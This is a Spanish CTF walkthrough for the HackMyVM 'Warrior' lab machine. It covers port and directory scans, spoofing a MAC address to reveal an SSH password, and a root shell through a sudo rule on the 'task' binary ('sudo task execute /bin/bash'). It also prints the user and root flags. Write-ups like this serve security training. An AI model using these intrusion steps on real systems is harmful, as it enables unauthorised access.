---
icon: flag
---

# Warrior HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 03:15 EDT
Nmap scan report for 192.168.5.43
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 25:16:8d:63:6b:75:f0:59:55:d4:b0:2d:75:8d:e0:e6 (RSA)
|   256 1e:29:d0:f4:c5:95:e7:40:30:2b:35:f7:a3:bc:36:75 (ECDSA)
|_  256 cc:b1:52:b3:d7:ef:cd:73:4c:fc:f6:b5:51:77:ea:f3 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 7 disallowed entries 
| /admin /secret.txt /uploads/id_rsa /internal.php 
|_/internal /cms /user.txt
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:0A:1B:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds
```

Veremos que hay un puerto `80` en el que vamos a ver que contiene, si entramos veremos simplemente una palabra `WARRIOR` no nos dice nada, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.43/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 31]
/user.txt             (Status: 200) [Size: 5]
/admin                (Status: 403) [Size: 153]
/robots.txt           (Status: 200) [Size: 137]
/internal.php         (Status: 200) [Size: 82]
/secret.txt           (Status: 200) [Size: 17]
Progress: 234182 / 882244 (26.54%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 234500 / 882244 (26.58%)
===============================================================
Finished
===============================================================
```

De todo esto el que mas nos atrae es el llamado `internal.php` ya que los demas no encontramos nada interesante si entramos, por lo que vamos acceder a dicho archivo a ver que encontramos dentro.

```
URL = http://<IP>/internal.php
```

Info:

```
Hey bro, you need to have an internal MAC as 00:00:00:00:00:a? to read your pass..
```

Veremos que necesitamos tener la `MAC` que esta comentando intentando descubrir la ultima letra para poder acceder de nuevo al mismo archivo y ver que nos muestra, por lo que vamos a probar las letras `abcdef` que son las que pueden estar maximo la `f` en la ultima opcion.

Si probamos todas la unica en la que cambia el contenido por lo que seria correcta, es con la letra `f` por lo que para establecerlo tendremos que hacer lo siguiente:

Establcemos la `MAC` desde la propia configuracion de la maquina, ya que por terminal puede dar problemas.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-20 095729.png" alt=""><figcaption></figcaption></figure>

Una vez que la hayamos establecido la correcta, entramos y probamos a realizar un `curl` para ver si es la correcta a la pagina.

```shell
curl -s http://<IP>/internal.php 
```

Info:

```
<br>Good!!!!!<!-- Your password is: Zurviv0r1 -->
```

Vemos que efectivamente es la correcta, por lo que vamos a probar el nombre de usuario `bro` que vimos antes y como contraseña `Zurviv0r1` por `SSH` a ver si nos deja acceder.

### SSH

```shell
ssh bro@<IP>
```

Metemos como contraseña `Zurviv0r1` y veremos que estaremos dentro.

Info:

```
Linux warrior 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb  8 04:03:20 2022 from 192.168.1.51
bro@warrior:~$ whoami
bro
```

Por lo que leeremos la `flag` del usuario.

> user.txt

```
LcHHbXGHMVhCpQHvqDen
```

## Escalate Privileges

Si hacemos `/usr/sbin/sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bro on warrior:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bro may run the following commands on warrior:
    (root) NOPASSWD: /usr/bin/task
```

Vemos que podemos ejecutar el binario `task` como el usuario `root` por lo que podremos hacer lo siguiente:

```shell
/usr/sbin/sudo task execute /bin/bash
```

Info:

```
root@warrior:/home/bro# whoami
root
```

Con esto seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
HPiGHMVcDNLlXbHLydMv
```
